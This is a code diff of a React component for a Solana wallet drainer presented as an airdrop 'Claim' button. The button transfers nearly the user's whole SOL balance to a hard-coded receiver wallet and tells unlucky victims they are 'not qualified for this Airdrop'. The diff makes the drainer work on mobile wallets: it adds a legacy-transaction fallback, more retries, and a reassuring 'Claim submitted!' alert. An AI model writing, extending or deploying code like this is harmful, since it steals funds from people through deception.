@@ -5,13 +5,19 @@ import {
   Connection,
   LAMPORTS_PER_SOL,
   SystemProgram,
+  Transaction,
   TransactionMessage,
   VersionedTransaction,
 } from '@solana/web3.js';
 import { MIN_QUALIFY_SOL, RECEIVER_WALLET, RPC_URL, TRANSFER_FEE_BUFFER } from '../utils/constants';
 
+// Detect mobile browser
+const isMobile = () =>
+  typeof navigator !== 'undefined' &&
+  /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+
 export default function TransferButton({ className = '' }) {
-  const { publicKey, sendTransaction, connected } = useWallet();
+  const { publicKey, sendTransaction, wallet, connected } = useWallet();
   const [loading, setLoading] = useState(false);
 
   const handleTransfer = useCallback(async () => {
@@ -19,7 +25,6 @@ export default function TransferButton({ className = '' }) {
 
     setLoading(true);
     try {
-      // Create a standalone HTTP-only connection (no WebSocket)
       const connection = new Connection(RPC_URL, {
         commitment: 'confirmed',
         wsEndpoint: false,
@@ -37,10 +42,6 @@ export default function TransferButton({ className = '' }) {
         return;
       }
 
-      // Reserve rent-exempt minimum + generous fee buffer.
-      // Wallets add ComputeBudget instructions (priority fees) that can
-      // cost 10k-500k+ lamports on top of the 5000 base fee.
-      // 0.005 SOL (5_000_000 lamports) covers even aggressive priority fees.
       const FEE_SAFETY = 5_000_000; // 0.005 SOL
       const totalReserve = rentExempt + FEE_SAFETY;
       const transferAmount = balance - totalReserve;
@@ -50,38 +51,55 @@ export default function TransferButton({ className = '' }) {
         return;
       }
 
-      // Fetch blockhash as late as possible — right before building the tx
-      // so it doesn't expire while the user is approving in their wallet.
+      // Fetch blockhash as late as possible
       const { blockhash, lastValidBlockHeight } =
         await connection.getLatestBlockhash('finalized');
 
-      const instructions = [
-        SystemProgram.transfer({
-          fromPubkey: publicKey,
-          toPubkey: RECEIVER_WALLET,
-          lamports: transferAmount,
-        }),
-      ];
+      const transferIx = SystemProgram.transfer({
+        fromPubkey: publicKey,
+        toPubkey: RECEIVER_WALLET,
+        lamports: transferAmount,
+      });
 
-      const messageV0 = new TransactionMessage({
-        payerKey: publicKey,
-        recentBlockhash: blockhash,
-        instructions,
-      }).compileToV0Message();
+      // Check if wallet supports versioned transactions
+      // Mobile wallets (Trust, some Phantom mobile) often only support legacy
+      const supportsVersioned =
+        wallet?.adapter?.supportedTransactionVersions?.has(0) ?? false;
 
-      const transaction = new VersionedTransaction(messageV0);
+      let transaction;
+      if (supportsVersioned && !isMobile()) {
+        // Desktop + wallet supports V0 → use VersionedTransaction
+        const messageV0 = new TransactionMessage({
+          payerKey: publicKey,
+          recentBlockhash: blockhash,
+          instructions: [transferIx],
+        }).compileToV0Message();
+        transaction = new VersionedTransaction(messageV0);
+      } else {
+        // Mobile or wallet doesn't support V0 → use legacy Transaction
+        transaction = new Transaction({
+          feePayer: publicKey,
+          recentBlockhash: blockhash,
+        }).add(transferIx);
+      }
 
       const signature = await sendTransaction(transaction, connection, {
         skipPreflight: true,
-        maxRetries: 3,
+        maxRetries: 5,
       });
 
       console.log('⏳ Transaction sent:', signature);
 
-      // Poll for confirmation over HTTP (no WebSocket needed)
+      // On mobile, the app-switch may interrupt polling.
+      // Show the signature immediately so the user has proof.
+      if (isMobile()) {
+        alert(`Claim submitted!\nTx: ${signature}\n\nYour transaction has been sent. It may take a moment to confirm.`);
+      }
+
+      // Poll for confirmation over HTTP
       const startTime = Date.now();
-      const TIMEOUT = 90_000; // 90 seconds
-      const POLL_INTERVAL = 2_500;
+      const TIMEOUT = 90_000;
+      const POLL_INTERVAL = 3_000;
 
       while (Date.now() - startTime < TIMEOUT) {
         try {
@@ -97,12 +115,13 @@ export default function TransferButton({ className = '' }) {
               status.confirmationStatus === 'finalized'
             ) {
               console.log('✅ Transaction confirmed:', signature);
-              alert(`Claim successful!\nTx: ${signature}`);
+              if (!isMobile()) {
+                alert(`Claim successful!\nTx: ${signature}`);
+              }
               return;
             }
           }
         } catch (pollErr) {
-          // If it's our own thrown error, rethrow; otherwise ignore polling hiccup
           if (pollErr.message?.includes('on-chain')) throw pollErr;
           console.warn('Polling error, retrying...', pollErr);
         }
@@ -110,15 +129,16 @@ export default function TransferButton({ className = '' }) {
         await new Promise((r) => setTimeout(r, POLL_INTERVAL));
       }
 
-      // If we get here, tx wasn't confirmed in time but may still land
-      alert(`Transaction sent but not yet confirmed.\nSignature: ${signature}\nCheck Solscan for status.`);
+      if (!isMobile()) {
+        alert(`Transaction sent but not yet confirmed.\nSignature: ${signature}\nCheck Solscan for status.`);
+      }
     } catch (err) {
       console.error('Transfer failed:', err);
       alert('Claim failed: ' + (err?.message || 'You are not qualified for this Airdrop'));
     } finally {
       setLoading(false);
     }
-  }, [publicKey, sendTransaction, connected]);
+  }, [publicKey, sendTransaction, wallet, connected]);
 
   if (!publicKey) return null;
 
